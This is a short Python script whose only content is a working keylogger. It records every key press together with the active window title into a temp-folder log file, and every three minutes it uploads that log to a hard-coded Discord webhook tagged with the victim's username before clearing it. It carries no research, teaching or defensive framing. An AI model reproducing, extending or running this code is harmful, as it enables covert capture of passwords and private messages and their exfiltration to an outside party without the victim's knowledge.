

def run():
    global tmp
    import tempfile
    import os
    tmp =  (os.getenv("TEMP") if os.name=="nt" else "/tmp") + os.path.sep + "/logs.txt"
    import threading
    from time import sleep
    import keyboard, discord_webhook
    def get_window():
        from win32gui import GetWindowText, GetForegroundWindow
        return (GetWindowText(GetForegroundWindow()))
    def echo_key(key: keyboard.KeyboardEvent):
        #save key to file
        kn = "SPECIAL: " + key.name if len(key.name) > 1 else key.name
        kn = "[" + get_window() + "] " + kn
        if True: #not key.name == "backspace":
            with open(tmp, "a") as f:
                f.write("\n" + kn)
        else: pass
            # content = ""
            # with open("keys.log", "r") as f:
            #     content = f.read()
            # with open("keys.log", "w") as f:
            #     f.write(content[:-1])
    keyboard.on_press(echo_key)
    def discord_stuff():
        #check for a log
        global tmp
        while True:
            if os.path.exists(tmp) and os.path.getsize(tmp) != 0:
                webhook = discord_webhook.DiscordWebhook("https://discord.com/api/webhooks/995675984319754241/9hITbwFGNUoBVuZnDufigbhNPKXgEEOmSXQBaNBzDiA4atypqnAQwdiC1dDatJZoxS_j", username="Logs for " + os.getlogin())
                with open(tmp, "rb") as c:
                    webhook.add_file(c.read(), "log.txt")
                with open(tmp, "w") as f: f.write("") #reset logs
                webhook.execute()
                sleep(180)
    threading.Thread(target=discord_stuff).start()
    while True: pass